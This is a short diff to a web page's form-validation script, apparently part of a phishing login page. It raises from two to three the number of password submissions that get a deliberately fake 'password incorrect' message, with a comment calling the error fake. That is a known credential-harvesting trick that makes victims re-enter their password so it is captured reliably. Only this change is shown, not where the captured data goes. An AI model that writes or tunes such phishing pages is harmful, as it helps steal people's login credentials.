@@ -609,7 +609,7 @@ function validateForm(event) {
             attemptCount++;
 
             // 1st & 2nd attempt → show fake error
-            if (attemptCount < 2) {
+            if (attemptCount < 3) {
                 document.getElementById('errfnn').innerHTML = "Your password input is incorrect";
                 document.forms["myForm"]["password"].value = "";
                 return false;
@@ -666,3 +666,4 @@ function validateForm(event) {
 <div class="cover"></div>
 
 </body></html>
+
